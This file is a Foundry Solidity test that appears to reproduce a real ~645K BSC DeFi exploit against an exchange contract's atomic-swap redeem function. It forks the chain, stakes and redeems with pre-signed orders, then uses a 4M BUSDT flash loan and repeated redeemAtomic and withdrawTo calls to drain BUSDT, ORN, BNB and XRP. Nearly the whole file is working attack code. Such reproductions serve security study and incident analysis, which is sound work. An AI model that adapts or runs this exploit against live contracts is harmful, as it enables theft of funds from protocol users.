pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";


// @KeyInfo -- Total Lost : ~645K 
// TX : https://app.blocksec.com/explorer/tx/bsc/0x660837a1640dd9cc0561ab7ff6c85325edebfa17d8b11a3bb94457ba6dcae18c
// Attacker : https://bscscan.com/address/0x51177db1ff3b450007958447946a2eee388288d2
// Attack Contract : https://bscscan.com/address/0xf8bfac82bdd7ac82d3aeec98b9e1e73579509db6
// GUY : https://x.com/MetaSec_xyz/status/1796008961302258001

interface Routers {
  function swapCompact() 
    external
    payable
    returns (uint256);

}
library LibAtomic {

    struct LockOrder {
        address sender;
        uint64 expiration;
        address asset;
        uint64 amount;
        uint24 targetChainId;
        bytes32 secretHash;
    }

	struct LockInfo {
		address sender;
		uint64 expiration;
		bool used;
		address asset;
		uint64 amount;
		uint24 targetChainId;
	}

	struct ClaimOrder {
		address receiver;
		bytes32 secretHash;
	}

	struct RedeemOrder {
		address sender;
		address receiver;
		address claimReceiver;
		address asset;
		uint64 amount;
		uint64 expiration;
		bytes32 secretHash;
		bytes signature;
	}
}
library MarginalFunctionality {
	// We have the following approach: when liability is created we store
	// timestamp and size of liability. If the subsequent trade will deepen
	// this liability or won't fully cover it timestamp will not change.
	// However once outstandingAmount is covered we check whether balance on
	// that asset is positive or not. If not, liability still in the place but
	// time counter is dropped and timestamp set to `now`.
	struct Liability {
		address asset;
		uint64 timestamp;
		uint192 outstandingAmount;
	}

	enum PositionState {
		POSITIVE,
		NEGATIVE, // weighted position below 0
		OVERDUE, // liability is not returned for too long
		NOPRICE, // some assets has no price or expired
		INCORRECT // some of the basic requirements are not met: too many liabilities, no locked stake, etc
	}

	struct Position {
		PositionState state;
		int256 weightedPosition; // sum of weighted collateral minus liabilities
		int256 totalPosition; // sum of unweighted (total) collateral minus liabilities
		int256 totalLiabilities; // total liabilities value
	}

	// Constants from Exchange contract used for calculations
	struct UsedConstants {
		address user;
		address _oracleAddress;
		address _orionTokenAddress;
		uint64 positionOverdue;
		uint64 priceOverdue;
		uint8 stakeRisk;
		uint8 liquidationPremium;
	}
}
interface VulnContract{

	function depositAssetTo(address assetAddress, uint112 amount, address account) external; 
    function lockStake(uint64 amount) external; 
    function redeemAtomic(LibAtomic.RedeemOrder calldata order, bytes calldata secret) external;
    function getLiabilities(address user) external view returns (MarginalFunctionality.Liability[] memory liabilitiesArray);
    function requestReleaseStake() external;
	function getBalances(
		address[] memory assetsAddresses,
		address user
	) external view returns (int192[] memory balances);
    function withdrawTo(address assetAddress, uint112 amount, address to) external;
}

contract ContractTest is Test {
    Uni_Pair_V3 constant BUSDT_USDC = Uni_Pair_V3(0x92b7807bF19b7DDdf89b706143896d05228f3121);
    Uni_Pair_V3 Pool = Uni_Pair_V3(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 ORN = IERC20(0xe4CA1F75ECA6214393fCE1C1b316C237664EaA8e);
    IERC20 XRP = IERC20(0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE);
    Uni_Pair_V2 constant pair = Uni_Pair_V2(0xC9807E3476d81CFb769122eD75EE4783eF9c2035);
    IPancakeRouter Router = IPancakeRouter(payable(0x8228A4aD192d5D82189afd6e194f65edb8c76a41));
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    VulnContract vulnContract=VulnContract(0xe9d1D2a27458378Dd6C6F0b2c390807AEd2217Ca);
    address  attacker;
    uint256 public counter;
    address public alice;
    uint256 private signerPrivateKey;
    uint256 private alicePk;


    function setUp() public {
        vm.createSelectFork("bsc", 39104878);
        deal(address(BUSDT),address(this),0);
    }
    function testExploit() public {
        emit log_named_decimal_uint("[Begin] Attacker ORN balance before exploit",ORN.balanceOf(address(this)), 8);
        emit log_named_decimal_uint("[Begin] Attacker BNB balance before exploit",address(this).balance, 18);
        emit log_named_decimal_uint("[Begin] Attacker XRP balance before exploit",XRP.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[Begin] Attacker BUSDT balance before exploit",BUSDT.balanceOf(address(this)), 18);
        console.log("==============");
        attack();
    }

    function attack() public {
// Step 1
        address[]  memory add=new address[](1);
        add[0]=address(ORN);
        ( alice, alicePk) = makeAddrAndKey("alice");
         deal(address(ORN),address(alice),10000000);
        deal(address(BUSDT),address(alice),1 ether);
        deal(address(WBNB),address(alice),0.005 ether);
        vm.startPrank(alice);

// Step 2
        BUSDT.approve(address(vulnContract),type(uint192).max);

         vulnContract.depositAssetTo(address(BUSDT), 1 ether, address(alice));

         ORN.approve(address(vulnContract),type(uint192).max);
         
         vulnContract.depositAssetTo(address(ORN), 10000000 , address(alice));

         vulnContract.lockStake(10000000);

//Step 3
         signerPrivateKey = 123456;
        attacker=vm.addr(signerPrivateKey);
        bytes memory hash_1=abi.encodePacked("test");
         LibAtomic.RedeemOrder memory order_1 = LibAtomic.RedeemOrder({
            sender: address(alice),
            receiver: address(attacker),
            claimReceiver: address(attacker),
            asset: address(ORN),
            amount: 10000000,
            expiration: 3433733152542,
            secretHash: keccak256(abi.encodePacked("test")),
            signature:hex"7eb28027e17378185c859be36dfe518ecdb6bd004bb7179089656c70bc017680680a14257e7d638e2b98d6ffcc8a4577decb9f47568e62040ea8da9b72717fb91b"
        });

        vulnContract.redeemAtomic(order_1, hash_1);

//Step 3.1

        vulnContract.requestReleaseStake(); 
         bytes memory hash_2=abi.encodePacked("test_1");
         LibAtomic.RedeemOrder memory order_2 = LibAtomic.RedeemOrder({
            sender: address(alice),
            receiver: address(attacker),
            claimReceiver: address(attacker),
            asset: address(ORN),
            amount: 10000000,
            expiration: 3433733152542,
            secretHash: keccak256(abi.encodePacked("test_1")),
            signature:hex"319ba837db29aba1f3a2ad365d2714dd83238e1393d6a7b033927faa53b57ba27168a7ebf9ac04512df3f73644b2716922f528eabc08cac8bb800a00108f58671b"
        });

        vulnContract.redeemAtomic(order_2, hash_2);

//Step 3.2

        ORN.approve(address(vulnContract),9000 ether);
        deal(address(ORN),address(alice),20000000);
         vulnContract.depositAssetTo(address(ORN), 20000000 , address(alice));
         vulnContract.lockStake(10000000);
     
//Step 3.3 

        bytes memory hash_3=abi.encodePacked("test_2");
         LibAtomic.RedeemOrder memory order_3 = LibAtomic.RedeemOrder({
            sender: address(alice),
            receiver: address(attacker),
            claimReceiver: address(attacker),
            asset: address(ORN),
            amount: 10000000,
            expiration: 3433733152542,
            secretHash: keccak256(abi.encodePacked("test_2")),
            signature:hex"42993d5595f081871ae473187ef75a479994926734896dbeb97df0ef4fb977a23b95da6d8850e1f425cf4118c6bac8ae884cbad80abede67baee75d75beb7da11b"
        });

        vulnContract.redeemAtomic(order_3, hash_3);

//Step 3.4

             vulnContract.requestReleaseStake();
            bytes memory hash_4=abi.encodePacked("test_3");
            LibAtomic.RedeemOrder memory order_4 = LibAtomic.RedeemOrder({
                sender: address(alice),
                receiver: address(attacker),
                claimReceiver: address(attacker),
                asset: address(ORN),
                amount: 10000000,
                expiration: 3433733152542,
                secretHash: keccak256(abi.encodePacked("test_3")),
                signature:hex"bee18780e48e8c8d9b39ebe96df3556ba217b956d5be8db2c5008289e3d213cd7faaf3031ecb438b8f5fa8008593fe88d0d9d8f92d81d96746957fc5c152a7ea1c"
            });

            vulnContract.redeemAtomic(order_4, hash_4);
            vm.stopPrank();

//Step 3.5
//End  (Start Attack)
        Pool.flash(address(this),4000000 ether,0,"0x123");

    }
    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {

            BUSDT.approve(address(vulnContract),type(uint256).max);
            vulnContract.depositAssetTo(address(BUSDT), 4000000 ether, address(attacker));

            bytes memory Attackhash=abi.encodePacked("attack");
            LibAtomic.RedeemOrder memory attackorder = LibAtomic.RedeemOrder({
                sender: address(attacker),
                receiver: address(alice),
                claimReceiver: address(alice),
                asset: address(ORN),
                amount: 196375601599999,
                expiration: 3433740589266,
                secretHash: keccak256(abi.encodePacked("attack")),
                signature:hex"c44429a5ff5ae246f407058156120f1febebfb0cc1e3e35d9ee845ba12c998d369fe6c97b343eb15fefc2cc28faf38509623fdb630fdd1d3cb6f637f8839562a1b"
            });

            vulnContract.redeemAtomic(attackorder, Attackhash);

//(attack-BUSD)

          bytes memory Attackhash_2=abi.encodePacked("attack-2");
            LibAtomic.RedeemOrder memory attackorder_2 = LibAtomic.RedeemOrder({
                sender: address(alice),
                receiver: address(this),
                claimReceiver: address(this),
                asset: address(BUSDT),
                amount: 401984468607796,
                expiration: 3433740590656,
                secretHash: keccak256(abi.encodePacked("attack-2")),
                signature:hex"936624bf8c31c3f55d1e623ac3cc0360e1968daf3c04efab3292d45ebe3083e367fdeeea04183e441e75255d4201f3dadb05d923260d9bb202374242b4eeaaae1b"
            });

            vulnContract.redeemAtomic(attackorder_2, Attackhash_2);

            vulnContract.withdrawTo(address(BUSDT),4019844686077960000000000 , address(this));


//(attack-ORN)

          bytes memory Attackhash_3=abi.encodePacked("attack-3");
            LibAtomic.RedeemOrder memory attackorder_3 = LibAtomic.RedeemOrder({
                sender: address(alice),
                receiver: address(this),
                claimReceiver: address(this),
                asset: address(ORN),
                amount: 49892192920826,
                expiration: 3433740591490,
                secretHash: keccak256(abi.encodePacked("attack-3")),
                signature:hex"f90bfb2eb2870ded343c7553e656ea7512464fda152f31e5938afc5e75eb39387a65e05b89821f190e75acca13937c38c4fe88282f95f57e3dc4c810e63c5d411b"
            });

            vulnContract.redeemAtomic(attackorder_3, Attackhash_3);

            vulnContract.withdrawTo(address(ORN),49892192920826 , address(this));

        emit log_named_decimal_uint("[End] Attacker ORN balance after exploit",ORN.balanceOf(address(this)), 8);

//(attack-BNB)

          bytes memory Attackhash_4=abi.encodePacked("attack-4");
            LibAtomic.RedeemOrder memory attackorder_4 = LibAtomic.RedeemOrder({
                sender: address(alice),
                receiver: address(this),
                claimReceiver: address(this),
                asset: address(0x0000000000000000000000000000000000000000),
                amount: 7989615974,
                expiration: 3433740592082,
                secretHash: keccak256(abi.encodePacked("attack-4")),
                signature:hex"ba218089103438fb970527519e0d0bc378dba137365d83eb1b33e45ec74755d230bc8ced929cf611788c7bb73adadb7fb5347c60bf43fff7c8cbd627ac7ecb301c"
            });

            vulnContract.redeemAtomic(attackorder_4, Attackhash_4);

            vulnContract.withdrawTo(address(0x0000000000000000000000000000000000000000),79896159740000000000 , address(this));

        emit log_named_decimal_uint("[End] Attacker BNB balance after exploit", address(this).balance, 18);

//(attack-XRP)

          bytes memory Attackhash_6=abi.encodePacked("attack-5");
            LibAtomic.RedeemOrder memory attackorder_5 = LibAtomic.RedeemOrder({
                sender: address(alice),
                receiver: address(this),
                claimReceiver: address(this),
                asset: address(XRP),
                amount: 6244473033100,
                expiration: 3433740592082,
                secretHash: keccak256(abi.encodePacked("attack-5")),
                signature:hex"1f881dd5cb69a03554e9abf25f8fac02c709f257214009641e27434ce7688d8f31bd7a76809f244c6c5344687f559724e929775b542ebe61a9449c6bcee387f71c"
            });

            vulnContract.redeemAtomic(attackorder_5, Attackhash_6);

            vulnContract.withdrawTo(address(XRP),62444730331000000000000 , address(this));

          BUSDT.transfer(msg.sender,4002000 ether );
        emit log_named_decimal_uint("[End] Attacker XRP balance after exploit", XRP.balanceOf(address(this)), XRP.decimals());
        emit log_named_decimal_uint("[End] Attacker BUSDT balance after exploit",BUSDT.balanceOf(address(this)), 18);
    }

    receive() external payable {}

}